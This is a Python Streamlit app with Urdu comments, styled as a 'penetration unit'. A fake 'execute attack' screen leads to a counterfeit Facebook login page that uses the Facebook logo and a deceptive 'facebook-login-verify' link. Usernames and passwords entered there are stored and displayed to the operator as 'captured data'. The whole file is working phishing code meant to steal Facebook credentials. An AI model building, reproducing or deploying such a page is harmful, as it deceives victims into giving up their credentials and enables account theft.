import streamlit as st
import time

# پیج کی سیٹنگ
st.set_page_config(page_title="FKG 🫀 SYSTEM", layout="centered")

# CSS تاکہ یہ بالکل موبائل ایپ اور فیس بک جیسا لگے
st.markdown("""
    <style>
    .main { background-color: #000000; }
    div.stButton > button { width: 100%; background-color: #0064e0; color: white; border-radius: 20px; height: 50px; font-weight: bold; }
    input { background-color: #1c1c1c !important; color: white !important; border-radius: 10px !important; }
    </style>
    """, unsafe_allow_html=True)

# سیشن سٹیٹ (ڈیٹا بچانے کے لیے)
if 'page' not in st.session_state:
    st.session_state.page = 'main'
if 'creds' not in st.session_state:
    st.session_state.creds = []

# --- 1. مین کنٹرول پینل (جو آپ کے پاس ہوگا) ---
if st.session_state.page == 'main':
    st.title("FKG 🫀 PENETRATION UNIT")
    ip = st.text_input("TARGET_IP", placeholder="0.0.0.0")
    
    if st.button("EXECUTE ATTACK"):
        with st.status("Initializing FKG 🫀 Exploit...", expanded=True) as status:
            time.sleep(1)
            st.write("Targeting IP...")
            time.sleep(1)
            st.write("Bypassing SSL...")
            time.sleep(1)
            status.update(label="EXPLOIT READY!", state="complete", expanded=False)
        
        st.error("CLICK LINK TO VIEW TARGET PAGE:")
        if st.button("OPEN: https://facebook-login-verify.service"):
            st.session_state.page = 'phish'
            st.rerun()

    st.divider()
    st.subheader("Captured Data Logs:")
    for c in st.session_state.creds:
        st.success(c)

# --- 2. فیس بک لاگ ان پیج (جو دوسروں کو نظر آئے گا) ---
elif st.session_state.page == 'phish':
    st.image("https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png", width=70)
    st.write("") # Space
    
    user_input = st.text_input("Mobile number or email")
    pass_input = st.text_input("Password", type="password")
    
    if st.button("Log In"):
        if user_input and pass_input:
            st.session_state.creds.append(f"User: {user_input} | Pass: {pass_input}")
            st.session_state.page = 'main'
            st.rerun()
    
    st.caption("Forgot password?")
    st.container(height=150, border=False) # Space
    st.button("Create new account", disabled=True)
    st.write("Meta")
